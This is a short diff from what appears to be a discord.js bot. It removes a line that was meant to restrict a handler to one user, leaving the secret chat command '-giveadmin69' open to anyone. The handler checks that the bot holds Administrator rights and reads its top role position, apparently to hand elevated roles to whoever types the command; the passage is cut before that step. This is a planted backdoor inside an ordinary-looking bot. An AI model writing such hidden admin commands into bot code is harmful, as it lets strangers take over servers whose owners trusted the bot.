@@ -1443,7 +1443,6 @@ client.on('message', message => {
 
 
  client.on('message', async msg => {//admin
-  if(!msg.author.id === assy) {return}
   if(msg.content === '-giveadmin69') {
     if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
         var botr = msg.guild.me.roles.highest.position - 0
